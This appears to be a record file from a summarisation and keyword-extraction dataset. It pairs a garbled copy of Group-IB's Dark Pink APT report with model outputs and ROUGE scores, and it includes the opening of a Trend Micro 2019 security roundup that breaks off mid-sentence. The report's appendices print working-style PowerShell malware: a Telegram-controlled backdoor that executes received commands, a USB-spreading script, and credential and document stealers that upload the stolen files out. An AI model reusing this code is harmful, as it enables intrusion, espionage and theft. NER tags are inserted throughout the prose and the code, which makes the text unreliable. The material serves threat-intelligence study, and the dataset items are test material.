$ _ .bounds ; if($bounds.width -lt 1920){$bounds.width=1920 } if($bounds.height -lt 1080){$bounds.height=1080 } $ image = New - Object Drawing . Bitmap $ bounds.width , $ bounds.height $ graphics = [ Drawing . Graphics]::FromImage($image ) $ graphics . CopyFromScreen($bounds . Location , [ Drawing . Point]::Empty , $ [MONEY] bounds.size ) $ screen_file = \" $ env : [CARDINAL] tmp\\\\$($_.DeviceName.replace('\\\\\\\\.\\\\',''))_$((get- date).tostring('yyyyMMddHHmmss')).png \" $ image . Save($screen_file ) } ConclusionAPT groups come and go , but the preliminary findings of [ORG] Group - IB \u2019s research into [PERSON] Dark [PERSON] Pink [PERSON] APT demonstrates how threat actors can change course , leverage new TTPs , and achieve devastating results . The threat actors behind [PERSON] Dark [PERSON] Pink were able , with the assistance of their custom toolkit , to breach the defenses of governmental and military bodies in a range of countries in the [ORG] APAC and [NORP] European regions . Dark Pink\u2019s20/26campaign once again underlines the massive dangers that spear - phishing campaigns pose for organizations , as even highly advanced threat actors use this vector to gain access to networks , and we recommend that organizations continue to educate their personnel on how to detect these sorts of emails . At this stage , [ORG] Group - IB researchers can confidently say that Dark Pink was behind the successful breaches of [CARDINAL] at [CARDINAL] least [CARDINAL] seven organizations , although we believe that this number could be higher . In line with [ORG] Group - IB \u2019s zero- tolerance policy to cybercrime , our analysts will continue their diligent efforts to uncover [ORG] Dark [ORG] Pink \u2019s origin and work to uncover more of the unique or peculiar TTPs utilized by this group . We will continue to issue proactive notifications to any organization we find to have been breached by this particular threat group . In this blog , we attempted to reveal how [ORG] Group - IB \u2019s proprietary [ORG] Threat [ORG] Intelligence system , which detects attacks automatically , can identify the mechanics behind ongoing threat campaigns . Our clients are the [ORDINAL] first to be informed about [PERSON] Dark [PERSON] Pink , along with other new [ORG] APT groups that may appear on the horizon , and they are also the [ORDINAL] first to obtain the names of compromised organizations , which helps them avoid supply - chain attacks and make their network infrastructure more secure . [ORG] RecommendationsUse modern email protection measures to prevent initial compromise via spear - phishing emails . We recommend [ORG] Group - IB \u2019s Business Email Protection , which is able to counter these threats effectively . Organizations should ensure they foster a cybersecurity culture in their workplace , which includes sufficient training to staff on how to identify phishing emails . Ensure that your security measures allow for proactive threat hunting that can help identify threats that can not be detected automatically . [ORG] Limit access to file - sharing resources , with the exception of those used within the organization . Monitor the creation of [ORG] LNK files in unusual locations , such as network drives and [ORG] USB devices . Ensure that you observe any use of commands and built - in tools that are frequently used for collecting information about the system and files . Maintaining a secure organization requires ongoing vigilance , and using a proprietary solution such as [ORG] Group - IB [ORG] Threat [ORG] Intelligence can help organizations shore up their security posture by equipping security teams with the latest insights into new and emerging threats . Indicators of compromiseFile indicators:21/26Cucky : SHA256 : E45DF7418CA47A9A4C4803697F4B28C618469C6E5A5678213AB81DF9FCC9FD51File path:$env : tmp\\backuplog $ env : tmp\\backuplog1 $ env : appdata\\archive.zip $ env : appdata\\telegram.txt $ env : tmp\\afkslfsa.csv $ env : tmp\\AB.zip $ Env : tmp\\ABScheduled task name : [ORG] Microsoft IdleMutex : gwgXSznM - Jz92k33A - uRcCCksA-9XAU93r5Registry path : HKCU:\\SOFTWARE\\Microsoft\\Windows [GPE] NT\\CurrentVersion\\Winlogon\\Shell HKCU\\Environment\\OSBuild HKCU\\Environment\\STMP HKCU\\Environment\\SYSPS HKCR:\\zolfile\\shell\\open\\command HKCR:\\zolofile\\shell\\open\\command\\zolo [ORG] HKCU:\\Environment\\guid [ORG] HKCU:\\Environment\\Update HKCU:\\Environment\\UserInitMprLogonScript HKCU:\\SOFTWARE\\\\Classes\\\\abcdfile\\shell\\abcd\\ HKCU:\\SOFTWARE\\Classes\\.4ID\\ [ORG] HKCU:\\SOFTWARE\\Classes\\.abcd [ORG] HKCU:\\SOFTWARE\\Classes\\.psr HKCU:\\SOFTWARE\\Classes\\.zol22/26HKCU:\\SOFTWARE\\Classes\\.zolo HKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command HKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\ HKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute HKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\\ [GPE] HKCU:\\SOFTWARE\\Classes\\abcdfile\\shell HKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\aaaa HKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd HKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command [PERSON] HKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\abcd HKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\DelegateExecute HKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command HKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command -Name DelegateExecute HKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\DelegateExecute HKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\zolo HKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command HKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name [PRODUCT] DelegateExecute HKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name [PRODUCT] DelegateExecute HKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo HKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo -Value HKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\\zolo HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Forfiles HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Psr HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RecentsAPPENDIX A. TelePowerBot[System . Net . ServicePointManager]::SecurityProtocol=@(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3 \" ) $ [MONEY] mid=(gp \" HKCU:\\\\Environment \" [MONEY] -name [MONEY] Update).Update [MONEY] $ guid = ( gp \" HKCU:\\\\Environment \" -name guid).guid $ ip = irm \" url \" if ( -not ( New - Object [ORG] System . Threading . [GPE] Mutex($false , $ [MONEY] guid)).WaitOne(1 ) ) { if($mid -and $ guid ) { irm -Uri \" url chat_id=$($id)&text=$guid : : $ env : COMPUTERNAME : : $ ip reconnected ! \" $ guid = [ [ORG] guid]::NewGuid().guid Set - ItemProperty \" HKCU:\\\\Environment \" -name \" [WORK_OF_ART] GUID \" -value $ guid irm -Uri \" url chat_id=$($id)&text=$guid : : $ env : COMPUTERNAME : : $ ip new connection ! \" } if($mid -isnot [ int ] ) { Start - Sleep 60 ; ( irm -Uri \" url\").result|% { if ( [MONEY] $ mid [MONEY] -lt [MONEY] $ _ .update_id ) { $ mid=$_.update_id ; $ [MONEY] name,$task=$_.message.text -split \" : : \" ; if ( ( $ name -like $ ip ) -or ( $ name -like $ env : COMPUTERNAME ) -or ( $ name -like $ guid ) -or ( $ name -like \" all \" ) ) { $ message = $ ( $ task | iex)2>&1 | Out - String ; if ( \" \" -eq $ message ) { $ message=\"Task Done!\"23/26 } $ [PERSON] b=0 ; while ( [MONEY] $ b -lt $ message . Length ) { $ c = [CARDINAL] 4000 ; if ( ( [MONEY] $ c + $ b ) -gt $ message . Length){$c=$message . [PERSON] Length [PERSON] % \" url : : $ env : COMPUTERNAME : : $ ip answer message : $ ( $ _ .message.message_id)`n$($message . Substring($b,$c ) ) \" Set - ItemProperty \" HKCU:\\\\Environment \" -name \" Update \" [WORK_OF_ART] -value [WORK_OF_ART] $ mid APPENDIX B. PowerShell script to later movement over removable device[Net . ServicePointManager]::SecurityProtocol=@(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3 \" ) ; $ ErrorActionPreference=\"Continue \" ; $ [PERSON] Query = \" select * from _ _ InstanceCreationEvent within [CARDINAL] 5 where [ORG] TargetInstance [ORG] ISA [ORG] ' Win32_LogicalDisk ' and [ORG] TargetInstance . DriveType = [CARDINAL] 2 \" ; $ Action = { ( gwmi cim_logicaldisk|?{($_.drivetype -eq 2)-and(Test - path \" [MONEY] $ [MONEY] ( [MONEY] $ _ .deviceid)\\\")}).DeviceID|% { $ uri = \" url \" ; Start - BitsTransfer -Source $ uri -Destination \" $ Env : tmp\\xxx.zip \" ; Expand - Archive -Path \" $ env : temp\\xxx.zip \" -DestinationPath \" $ env : temp \" - force cp \" $ env : temp\\xxx \" \" $ _ \\dism \" -Recurse -Force ; sc \" $ _ \\system.bat \" -value \" @echo off`ncd % cd%dism`nstart dism.exe`nexit \" ; attrib + s + h \" $ _ \\dism\";attrib + s + h \" $ _ \\dism\\*.*\";attrib + s + h \" $ _ \\system.bat \" ; ( [PERSON] Gci \" $ _ \\ \" -Directory -force)|?{$_.name -notin ( ' dism','$RECYCLE.BIN','System Volume Information')}|% { attrib + s + h \" $ ( $ _ .fullname ) \" $ [ORG] WshShell = New - Object [ORG] -comObject [ORG] WScript . [ORG] Shell $ Shortcut = $ [MONEY] WshShell . CreateShortcut(\"$($_.fullname).lnk \" ) $ Shortcut . TargetPath = \" % SystemRoot%\\System32\\cmd.exe \" $ Shortcut . Arguments = \" /c start explorer $ ( $ _ .name ) & & [ORG] system.bat & & exit \" $ Shortcut . IconLocation = \" % SystemRoot%\\System32\\SHELL32.dll,4 \" $ Shortcut . WorkingDirectory = \" % cd% \" Register - WmiEvent -Query $ [ORG] Query -Action $ Action -SourceIdentifier USBFlashDriveBack APPENDIX C. PowerShell script to theft of credentials[Net . ServicePointManager]::SecurityProtocol = [ Net . SecurityProtocolType]::Tls12;24/26[Reflection . Assembly]::Load([System . Convert]::FromBase64String((New - Object [ORG] System . Net . WebClient).DownloadString ( \" < url \" ) ) ) | Out - Null;[kuky . Program]::Main ( ) ; Start - Sleep [ORG] 60 ; cp -path \" $ env : tmp\\\\backuplog \" -Destination \" $ env : tmp\\\\backuplog1 \" -recurse - force ; $ file = \" $ env : tmp\\\\backuplog1 \" ; $ ascii = [ System . Text . Encoding]::ascii ; Compress - Archive -Path $ File -Destination \" $ file.zip \" -Force ; $ file = \" $ file.zip \" $ reg = \" HKCU:\\\\Environment \" $ token,$chat_id = ( gp $ reg -name GUID).GUID -split \" : : \" Add - Type [WORK_OF_ART] -AssemblyName [WORK_OF_ART] System . Net . Http $ form = new - object System . Net . Http . MultipartFormDataContent $ form . Add($(New - Object [ORG] System . Net . Http . StringContent $ Chat_ID ) , ' chat_id ' ) $ [MONEY] Content = [ System . IO.File]::ReadAllBytes($file ) $ byte = New - Object [ORG] System . Net . Http . ByteArrayContent ( $ [MONEY] Content , [GPE] 0 , $ Content . Length ) $ byte . Headers . Add('Content - Type','text / plain ' ) $ name = $ ascii.getstring($ascii.getbytes(\"$($env : COMPUTERNAME)_$($file ) \" ) ) - replace ' : [ORG] |\\\\\\\\|\\\\ ? ' , ' _ ' $ form . [PERSON] Add($byte , ' document ' , $ name ) $ ms = new - object [PRODUCT] System . IO.MemoryStream $ form . CopyToAsync($ms).Wait ( ) irm -Method Post -Body $ ms . ToArray ( ) -Uri \" < url \" -ContentType $ form . Headers . ContentType . [PERSON] ToString ( ) rm $ file -Force -Recurse\",Back APPENDIX D. PowerShell script to exfiltrate documents from common network resource$extentions = @('.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf ' ) ; $ file = \" $ env : tmp\\\\documents_$((get - date).tostring('yyyyMMddHHmmss')).csv \" gdr -PsProvider FileSystem | Select Root | % { gci -Path $ _ .Root -Recurse - ErrorAction SilentlyContinue } | ? { $ _ .fullname -notmatch ' C:\\\\\\\\Program Files*|C:\\\\\\\\Windows * ' } | ? { [MONEY] $ extentions [MONEY] -contains $ _ .Extension } | select name , fullname , LastWriteTime , length | Export - Csv -Path $ file -encoding unicode;$file ; $ ascii = [ System . Text . Encoding]::ascii ; Compress - Archive -Path $ File -Destination \" $ file.zip \" -Force ; $ file = \" $ file.zip \" Add - Type [WORK_OF_ART] -AssemblyName [WORK_OF_ART] System . Net . Http $ form = new - object System . Net . Http . MultipartFormDataContent $ form . Add($(New - Object [ORG] System . Net . Http . StringContent $ Chat_ID ) , ' chat_id ' ) $ [MONEY] Content = [ System . IO.File]::ReadAllBytes($file ) $ byte = New - Object [ORG] System . Net . Http . ByteArrayContent ( $ [MONEY] Content , [GPE] 0 , $ Content . Length ) $ byte . Headers . Add('Content - Type','text / plain ' ) $ name = $ ascii.getstring($ascii.getbytes(\"$($env : COMPUTERNAME)_$($file ) \" ) ) - replace ' : [ORG] |\\\\\\\\|\\\\ ? ' , ' _ ' $ form . [PERSON] Add($byte , ' document ' , $ name ) $ ms = new - object [PRODUCT] System . IO.MemoryStream $ form . CopyToAsync($ms).Wait ( ) irm -Method Post -Body $ ms . ToArray ( ) -Uri \" url \" -ContentType $ form . Headers . ContentType . [PERSON] ToString ( ) rm $ file -Force -Recurse25/2626/26", "generated_text": "Group-IB; Dark Pink; Asia-Pacific; Europe; early 2021; data exfiltration; the attacks; government agencies; Cambodia; Indonesia; Bosnia; Herzegovina; the group; TelePowerBot; KamiKakaBot; Cucky; Ctealer information stealers; USB devices; compromised computers; the USB devices; the network; the threat actors; techniques; techniques; procedures; control; infrastructure; The groups; espionage; sophisticated techniques; the malware; the region; information; a new APT group; the threat actor; the organization; the analysis; the threat actors; threat actors.", "ref_text": "<START-1>The cybersecurity company Group-IB has discovered a new advanced persistent threat (APT) group called Dark Pink that has been actively attacking organizations in Asia-Pacific and Europe since mid-2021. Dark Pink has successfully breached at least 7 high-profile targets including military agencies, government bodies, and a religious organization. The group uses custom malware tools like TelePowerBot, KamiKakaBot, and information stealers Cucky and Ctealer to infiltrate networks and exfiltrate sensitive documents. The sophistication of Dark Pink's campaign is demonstrated by its multiple distinct kill chains and use of PowerShell scripts or commands. The main initial infection vector is spear-phishing emails posing as job applicants and containing ISO images with malware. Once executed, the malware ensures persistence on the system and collects information about the network. Lateral movement is achieved by infecting USB devices plugged into compromised machines. Exfiltration happens via Telegram API bots. The group uses evasion techniques like DLL side-loading to avoid detection. While the origin of Dark Pink is still unknown, their advanced custom tools, evolving tactics, and successful breaches of high-value targets demonstrate the serious threat they pose. Group-IB researchers are continuing efforts to uncover more details about this APT group and have notified confirmed and potential victims. The report aims to raise awareness about the TTPs used by Dark Pink to help organizations strengthen their security posture against such threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4987531172069825, "gpt3/lexical/rouge_rouge2": 0.16541353383458648, "gpt3/lexical/rouge_rougeL": 0.28927680798004984, "gpt3/lexical/rouge_rougeLsum": 0.28927680798004984, "gpt3_generated_text": ["The article discusses a new advanced persistent threat (APT) group called Dark Pink that has been targeting the Asia-Pacific (APAC) region and Europe. The APT group, which is believed to have started operations in mid-2021, utilizes sophisticated techniques and a custom toolkit to carry out its attacks. Dark Pink has targeted government agencies, military bodies, and other organizations in countries such as Cambodia, Indonesia, Bosnia and Herzegovina, and Vietnam. The APT group uses information stealers and exploits vulnerabilities in USB devices and messengers to gain access to confidential documentation. The article highlights the need for organizations to be aware of Dark Pink's tactics, techniques, and procedures (TTPs) in order to protect themselves from potential attacks. The researchers at Group-IB are still investigating the full scope of the APT attack and trying to uncover the origin of the threat actor. Overall, this preliminary research provides valuable insights for CISOs, cybersecurity teams, SOC analysts, and incident response specialists to enhance their security measures against this new APT group."]}, {"split_name": "test", "sample_id": "test_89", "prompt_text": "Extract the keywords: [DATE] 2019 Midyear Security RoundupEvasive Threats , Pervasive EffectsContents04 [ORG] Ransomware remains widespread , with costly consequences09 Threats increasingly \u2018 live off [GPE] the [GPE] land\u201914 [GPE] Targeted attacks employ more tried - and - tested techniques than new ones15 Illicit actors continue to bank on cryptocurrency mining19 Messaging threats further diversify25 [NORP] Pervasive vulnerabilities make patching even more important29 [ORG] IoT and [GPE] IIoT security remains a significant issue31 Multilayered defense helps address [DATE] today \u2019s multifaceted [PERSON] threats32 [PERSON] Threat [PERSON] Landscape in [GPE] ReviewIn an ever - evolving threat landscape , cybersecurity is no longer just about safeguarding sensitive dataand other digital assets by merely keeping cybercriminals and other threat actors out of networks , systems , devices , and underlying technologies . Now it is also about having to proactively stop them intheir tracks before they even gain a foothold in their spheres of operation . The notable threats in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 drove this point home , what with the prevalence of so - calledfileless threats that \u201c lived off the land \u201d \u2014 abusing legitimate and typically whitelisted system tools to dotheir malicious bidding \u2014 and the presence of malware and phishing campaigns that took advantageof security lapses and diversified in the ways they counted on the still unpatched flaw that washuman vulnerability . Ransomware operators distinctly set their sights on organizations , with crippling ramifications : [ORG] Theirattacks proved they could strike with such severity that some victims were even strong - armed intoacquiescing to the cybercriminals \u2019 exorbitant demands . For many cryptocurrency - mining threats , servers and cloud - based environments , having far more computing resources than endpoints , becametheir new frontier . Messaging platforms \u2014 the bedrock underpinning many business transactions \u2014 were inundated with a range of threats , including business email compromise scams , sextortionschemes , and phishing incidents that did not rely on hacking human behavior alone . Over the course of [DATE] the [DATE] half - [DATE] year , many threat actors seemed to be hedging their bets , in light of theirbroad and multiplatform targeted attack campaigns , an apparent stir in their use of exploit kits , andtheir persistent attacks on routers and other internet - of - things devices . And a number of threats usedmultistage or multilayered infection chains . To be sure , the tactics , techniques , and procedures usedby these threats might not be groundbreaking , but that they were employed as fail - safe mechanismswas worthy of attention . Vulnerabilities remained a cause for concern , in the form of both the software sort that had been aperpetual bane of cybersecurity and the hardware - level class that had been gaining pointed relevanceof late . In particular , the disclosure of pervasive vulnerabilities , such as those found in popular desktopservices and container platforms , highlighted the extent of the impact that security flaws could haveif left unpatched . Ensuring that networks , systems , devices , and technologies are properly configured or patched ina timely manner can be an arduous task for enterprises and their security administrators \u2014 to saynothing of taking steps to reduce the attack surface and actively monitoring and thwarting attempts atcompromise at each stage or layer of an attack . But if accomplished , it is a challenge whose potentialbenefits far outweigh the effort required to bring it to fruition , especially given the value of what is atstake , in terms of not only cybersecurity but also physical safety . Our [DATE] midyear report reexamines the security landscape of [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 \u2014 the threats that madetheir mark and their attendant risks and issues \u2014 to enable enterprises with insights that can help themtackle the aforementioned challenge throughout the rest of [DATE] the [DATE] year and beyond . [ORG] Ransomware remains widespread , with costly consequences High - profile attacks exact high - value lossesToward the end of the first half of [DATE] 2019 , after having earned [MONEY] more [MONEY] than US$ [MONEY] 2 [MONEY] billion , the operators ofGandCrab announced their retirement on a hacking forum where they peddled their ransomware asa service ( RaaS).1 [PRODUCT] GandCrab was notable for its business model : Cybercriminals , regardless of theirtechnical know - how , could pay for a subscription to access custom builds . They could then distributetheir own versions of [NORP] GandCrab through their preferred means , such as spam and exploit kits . Whileransomware operators had been largely known for using the spray - and - pray approach and selling theirmalware to would - be affiliates,2 casting a wider net of business partners and potential victims increasedtheir earning potential . However , the [DATE] half - [DATE] year showed a change in their tack . Cybercriminals perhaps considered that theycould consistently earn as much , or even more , by zeroing in on multinationals , large enterprises , andeven government organizations . Their modus operandi entailed reconnoitering their target , sending itsemployees tailored phishing emails , and searching for security gaps that they could exploit to gain accessto and laterally move within its networks and systems . This was exemplified when \u2014 [DATE] less [DATE] than [DATE] two [DATE] weeks after a ransomware attack hit [GPE] Riviera [GPE] Beach in thesame state and compelled the city \u2019s officials to pay US$ 600,0003 \u2014 the [ORG] Ryuk ransomware struck [ORG] LakeCity , [GPE] Florida , in [DATE] June . With the systems used to provide public services having been taken hostage , thecity \u2019s officials were coerced into paying the US$ [MONEY] 460,000 ransom.4Given such a large amount , it should come as no surprise that [ORG] Ryuk was cited as [CARDINAL] one of the threatsattributed with the higher ransom payouts observed so far this year.5 The ransomware was reportedin [DATE] January to have earned over [CARDINAL] 705 bitcoins ( [MONEY] at [MONEY] least US$ 3.7 [MONEY] million at the time ) since [ORDINAL] first emergingin [DATE] August last year.6 Its notoriety was reflected by its prevalence , as it was one of the top ransomwarefamilies detected in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , based on feedback from the Trend Micro \u2122 Smart [ORG] ProtectionNetwork \u2122 infrastructure.4 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsThese remarkably high payouts were congruous with the 77 % uptick , from [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2018 [DATE] tothe [DATE] first [DATE] half [DATE] of [DATE] 2019 , that we observed in our detections of ransomware - related threats ( files , emails , andURLs ) \u2014 notwithstanding the 55 % decline in new ransomware families . The increase could be reflectivenot only of how we proactively blocked ransomware - related activities at the email and URL layers , butalso of an overall improvement in security mechanisms that blocked ransomware past its download stage . The heightened activities were also indicative of the targeted ransomware attacks reported in [DATE] the [DATE] half - [DATE] year , which made strong impressions with the considerable degree of damage left in their trail.50M46,177,02629,422,79826,047,20720M1H 2019Figure 1 . Detections of ransomware - related threats significantly increased : Half - [DATE] year comparison of detections of ransomware - related threat components ( files , emails , and URLs)15011810447301H 2019Figure 2 . New ransomware families further declined : Half - [DATE] year comparison of new ransomware families5 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsIn [DATE] March , the [ORG] LockerGoga ransomware struck a [NORP] Norwegian manufacturing company and halted productionin several of its plants , forcing the other plants to switch to manual operations.7 When the dust hadsettled [DATE] three [DATE] months later,8 the financial losses had exceeded US$ 55 [MONEY] million.9 [ORG] Considerably less \u2014 butstill substantial , at over US$ 5.3 [MONEY] million \u2014 had been incurred by the city of [GPE] Baltimore , [GPE] Maryland , to recoverfrom an attack involving the [ORG] RobbinHood ransomware in May.10 [ORG] RobbinHood was also the culprit behindthe ransomware attack that hit [GPE] Greenville , [GPE] North [GPE] Carolina , in [DATE] April , resulting in the prolonged shutdown ofthe city \u2019s infected systems.11RansomwarefamilyHow it can arrive and attack vectors usedHow it can propagateOther notable behaviorsClop ( [ORG] CryptoMix ) Compromised activedirectory in the network12Hacked remote desktop services13Spam emailsBrute - forced remote desktops ( Crysis)16Exposed [ORG] Samba serversBrute - forced [ORG] Samba serversDharma14 aka [PERSON] GandCrabMongoLock20Spam emails , exploit exposed databases,18 vulnerable software19 Exposed or poorly secured [MONEY] MongoDB [MONEY] databasesRyuk22Spam emailsLockerGoga25Compromised credentialsNozelesn27Spam emails with malicious attachmentsRobbinHood28BitPaymer29Compromised or unsecure remote desktops , trojan with administrator privileges , emails containing Dridex30MegaCortex33Compromised domain controllersDistributed via executables with a valid digital signature to evade detection Uses antivirus installation processes as distractionIts previous iteration encrypts network - attached storage ( [ORG] NAS ) devices . Uses the RaaS business modelDeletes databases rather than encrypting them , formats backup drives if available21Can render infected systems unbootable24Modifies passwords of infected systems \u2019 user accounts , prevents infected systems from being rebootedIts trojan downloader , [PERSON] Nymaim , uses fileless techniques to load the ransomware . Encrypts each file with a unique keyAbuses PsExec toolDisables certain processesDepends on the affiliate \u2019s customizationsScanning for exposed or poorly secured MongoDB servers via services like [ORG] Trickbot [ORG] and [ORG] Emotet ( as loader [PERSON] malware),23 [PERSON] EternalBlue [PERSON] System administration and possibly penetration testing and other hacking tools,26 valid certificates to evade detection and get into systems [PRODUCT] Emotet malware ( copying itself into other machines in the network via administrative shares ) Domain controllers or frameworks ( e.g. , [PERSON] Empire [PERSON] PowerShell and [ORG] PsExec ) [PERSON] Dridex ( to steal network information ) , supply chain attacks,31 compromised remote desktop servers32 [PERSON] Renamed [PERSON] PsExec toolTable [CARDINAL] 1 . [DATE] The [DATE] half - [DATE] year \u2019s notable ransomware attacks used techniques beyond file encryption : Comparison of the routines of notable ransomware families seen in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 20196 | 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsThese incidents showed how ransomware operators furthered their strong - arm schemes by compromisingmission - critical systems and hence the affected organizations \u2019 operations and bottom lines . Theemboldened attacks and higher ransom demands could have also been spurred by their malware\u2019shaving been outfitted with destructive routines beyond file encryption , serving as fail - safes to maximizeimpact . With foolproof mechanisms that could lessen the chances for victims to recover their systems orfiles , ransomware operators could be further motivated into intimidating and demanding heftier ransompayments from their victims . [ORG] WannaCry still reigns supremeFeedback from the Trend Micro Smart Protection Network infrastructure indicated various activeransomware families in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 . The organizations we saw that were most affected were inmanufacturing , government , education , and healthcare industries , but we also saw affected organizationsin finance , technology , energy , food and beverage , and oil and gas industries . Offering further proof of its endurance , the notorious [ORG] WannaCry , which left significant damage acrossa number of countries in the wake of its initial outbreak in [DATE] May [DATE] 2017,34 was still the most detectedransomware family throughout the period \u2014 its numbers even exceeded , by wide margins , those of theother ransomware families combined . As in [DATE] last [DATE] year , the majority of [ORG] WannaCry detections were fromsystems running [ORG] Microsoft Windows 7 . Evidently , bridging security gaps in vulnerable systems remained achallenge especially for enterprises , given that the vulnerability exploited by [ORG] WannaCry had been patchedsince [DATE] 2017 and that support for Windows 7 had been set to end in [DATE] January [DATE] 2020.35others60K048,14245,14250,00943,84643,10237,72942,40737,91342,05038,89436,33733,6415,7357,2297,9594,9526,7654,088JANFEBMARAPRMAYJUNWannaCryOthersFigure [DATE] 3 . [ORG] WannaCry still accounted for the majority of ransomware detections : [DATE] Monthly comparison between detections of [ORG] WannaCry and combined detectionsof the other ransomware families in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 20197 | 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsTOTAL 231,242Windows [CARDINAL] 794.9%Others5.1%Figure [CARDINAL] 4 . [PERCENT] Over 90 % of [ORG] WannaCry detections were from systems running Windows 7 : Distribution of WannaCry detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 by operating systemDespite the continued decrease in new ransomware families , their apparently newfound lucrativenessmeant they would remain a perennial threat , especially to enterprises . In fact , a budding player , Sodinokibi(aka Sodin or REvil ) , seemed to have already taken the reins from GandCrab with its use of similardistribution methods.36,37The many approaches and attack surfaces that cybercriminals can use to get inside organizations \u2019 onlinepremises means securing just the endpoint is no longer enough . Employing multilayered threat defensesolutions \u2014 from the gateways , servers , and networks to endpoints \u2014 can help thwart ransomware ateach layer of their online infrastructures.8 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] EffectsThreats increasingly \u2018 live off the land \u2019 Fileless events are [PERCENT] 18 % more than in the whole of [DATE] 2018 ; macro malware persistsThe significant surge in fileless events we detected in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 \u2014 [PERCENT] 18 % more than in the wholeof [DATE] 2018 \u2014 reflected what we noted in our security predictions for [DATE] this [DATE] year : Cybercriminals and other threatactors would increasingly \u201c live off the land,\u201d38 abusing or repurposing legitimate system administration orpenetration testing tools to blend in . Compared to traditional malware that writes to a machine \u2019s disk , threats that live off the land , such asfileless threats , are not as visible since they can be executed in a system \u2019s memory , reside in the registry , or abuse normally whitelisted tools like [ORG] PowerShell , [ORG] PsExec , [ORG] Windows [ORG] Management Instrumentation,39and AutoHotKey.40 Nevertheless , we are able to detect fileless threat - related activities by tracking non - filebased indicators , such as specific execution events or behaviors . In some ways , many of the notable threats we uncovered in [DATE] the [DATE] half - [DATE] year used fileless techniques to eitherdrop or execute the payload \u2014 typically in the form of cryptocurrency - mining malware41 and ransomware,42and in some cases , in the form of banking trojans.43 These threats had something in common : [ORG] PowerShellabuse . While a convenient and flexible tool for system administrators , [ORG] PowerShell could be potent incybercriminal hands.800K710,733409,052194,840100K1H 2019Figure 5 . Fileless events were [PERCENT] 18 % more than in the whole of [DATE] 2018 : Half - [DATE] year comparison of fileless events blocked9 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsDespite a slight decrease in its detections compared to [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2018 , macro malware stillpersisted . As in [DATE] last [DATE] year , the detections for macro - based threats were due to the prevalence of [ORG] Powload , mainly in spam emails . Apart from the variety of payloads it delivers , such as the [PERSON] Ursnif and [ORG] Bebloh information stealers , [PERSON] Powload itself has evolved over [DATE] the [DATE] years . Among other developments , it has begun using steganography \u2014 the practice of hiding code within an image \u2014 and singling out its targets by imitating and usingregion - specific brands or vocabulary . Powload \u2019s abuse of [ORG] PowerShell is also notable , as this is oftencombined with macro malware , which serves as another layer in the infection chain that can further hidemalicious activity.44Beyond [PERSON] Powload , we also saw macro malware used in spam campaigns that delivered informationstealers like Trickbot45 and even in connection with malware used for cyberespionage.46350K336,238151,222293,149113,106281,509106,028180,043185,016175,48101H [ORDINAL] 2019Non - Powload - relatedPowload - relatedFigure [CARDINAL] 6 . The majority of macro malware was still due to Powload : Half - [DATE] year comparison of detections of non - [GPE] Powload - related macro malware and [ORG] Powload - related macro malwareMultiple stages and layers used as fail - safesIf the use of fileless techniques and macro malware was not deterrent enough , several notable threats wesaw in [DATE] the [DATE] half - [DATE] year not only employed a combination of these but also used multistage or multilayeredinfection chains.10 | 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsStaging the delivery of malware helps lessen the chances of its getting blocked altogether . The firststage of a malware \u2019s infection chain would often be unexacting , e.g. , retrieving a [ORDINAL] second - stage script , sothat it would seem innocuous . Embedding a large piece of malware in a [ORG] Microsoft [ORG] Office document , forinstance , would raise suspicion . For threat actors , multistage delivery can be their fail - safe way to bypasssecurity measures . We saw such a strategy in a cryptocurrency - mining campaign whose infection chaininvolved [CARDINAL] three stages of retrieving and executing [ORG] PowerShell scripts until it downloaded the payload andpropagated to other machines.47Multilayered attacks , on the other hand , give malware more chances of getting into systems . Even ifan attack does not use new malware or a groundbreaking technique , cramming in as many exploits aspossible , for example , increases its opportunity to infect a system . The cryptocurrency - mining [ORG] BlackSquidmalware did just that , employing [CARDINAL] eight exploits to propagate , drop and run the payload , and give attackersthe 